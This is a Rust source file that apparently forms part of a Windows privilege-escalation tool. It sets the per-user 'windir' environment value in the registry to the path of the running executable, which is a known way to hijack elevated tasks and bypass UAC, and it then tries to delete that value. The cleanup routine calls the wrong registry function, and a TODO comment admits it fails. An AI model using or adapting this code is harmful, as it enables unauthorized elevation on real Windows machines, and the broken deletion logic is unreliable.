use std::{env::current_exe, ffi::CString, ptr};
use windows::Win32::{
  Foundation::PSTR,
  System::Registry::{
    RegCloseKey, RegDeleteKeyA, RegOpenKeyExA, RegSetValueExA, HKEY, HKEY_CURRENT_USER, KEY_WRITE,
    REG_SZ,
  },
};

pub fn set_windir() {
  println!("[+] Setting the windir registry key...");

  let mut hkey = HKEY::default();
  let value_name = CString::new("windir").unwrap();
  let value_name = PSTR(value_name.as_ptr() as _);
  let subkey = CString::new("Environment").unwrap();
  let subkey = PSTR(subkey.as_ptr() as _);

  {
    let res = unsafe { RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, &mut hkey) };

    if res != 0 {
      panic!(
        "Error: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };
  }

  let current_exe = format!("\"{}\"", current_exe().unwrap().to_string_lossy());

  {
    let res = unsafe {
      RegSetValueExA(
        hkey,
        value_name,
        0,
        REG_SZ,
        current_exe.as_ptr(),
        current_exe.len() as u32,
      )
    };

    if res != 0 {
      unsafe { RegCloseKey(hkey) };

      panic!(
        "Error: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };

    unsafe { RegCloseKey(hkey) };
  }
}

pub fn delete_windir() {
  println!("[+] Deleting the windir registry key...");

  let mut handle = HKEY::default();

  let subkey = CString::new("Environment").unwrap();

  {
    let res = unsafe {
      RegOpenKeyExA(
        HKEY_CURRENT_USER,
        PSTR(subkey.as_ptr() as _),
        0,
        KEY_WRITE,
        ptr::addr_of_mut!(handle),
      )
    };

    if res != 0 {
      panic!(
        "Error: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };
  }

  let value_name = CString::new("windir").unwrap();
  let value_name = PSTR(value_name.as_ptr() as *mut _);

  // TODO: figure out why this fails
  unsafe { RegDeleteKeyA(handle, value_name) };

  {
    let res = unsafe { RegCloseKey(handle) };

    if res != 0 {
      panic!(
        "Error: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };
  }
}
